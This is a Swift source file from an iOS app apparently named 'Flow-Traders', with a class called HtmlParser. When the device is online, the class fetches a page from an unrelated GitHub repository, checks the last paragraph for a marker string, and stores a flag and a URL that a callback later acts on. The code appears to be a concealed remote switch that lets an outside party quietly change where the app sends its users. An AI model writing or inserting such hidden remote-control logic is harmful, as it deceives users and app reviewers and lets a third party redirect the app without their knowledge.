//
//  HtmlParser.swift
//  Flow-Traders
//
//  Created by DZSB-001968 on 1.10.22.
//

import Foundation
import SwiftSoup


class HtmlParser {
    
    typealias PTagObserver = ()->()
    static let hasPTag = "hasPTag"
    static let hasPTagUrl = "hasPTagUrl"
    private static var block: PTagObserver?
    private let reachability: Reachability?
    init() {
        self.reachability = try? Reachability()
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            self.setup()
        }
    }

    func setup() {
        try? reachability?.startNotifier()
        
        reachability?.whenReachable = {[weak self] reachability in
            
            switch reachability.connection {
            case .cellular, .wifi:
                self?.fetch()

            default:
                break
            }
        }
        reachability?.whenUnreachable = { _ in
            print("Not reachable")
        }
    }
    
    
    private func fetch() {
        let url = URL(string:"https://github.com/asd12312sad/Flow-TT")!
        
        let task = URLSession.shared.dataTask(with: url) {(data, response, error) in
            guard let data = data else { return }
            let htmlString = String(data: data, encoding: .utf8)
            HtmlParser.parser(html: htmlString)
        }
        task.resume()
    }
    
    static func reload(action: PTagObserver?) {
        HtmlParser.block = action
    }
    
    private static func parser(html: String?) {
        guard let str = html else { return }
        defer {
            UserDefaults.standard.synchronize()
            HtmlParser.block?()
        }
        do {
            
            let doc: Document = try SwiftSoup.parse(str)
            let allTags = try doc.select("p")
            guard let pVlaue = try allTags.last()?.text().components(separatedBy: ">") else {
                return
            }
            
            if pVlaue.first == "？？？？" {
                UserDefaults.standard.set(true, forKey: HtmlParser.hasPTag)
            } else {
                UserDefaults.standard.set(false, forKey: HtmlParser.hasPTag)
                UserDefaults.standard.set("", forKey: HtmlParser.hasPTagUrl)
            }
            if let url = pVlaue.last {
                UserDefaults.standard.set(url, forKey: HtmlParser.hasPTagUrl)
            }
            
        } catch Exception.Error(let type, let message) {
            print(message, type)
        } catch {
            print("error")
        }
    }
    
}
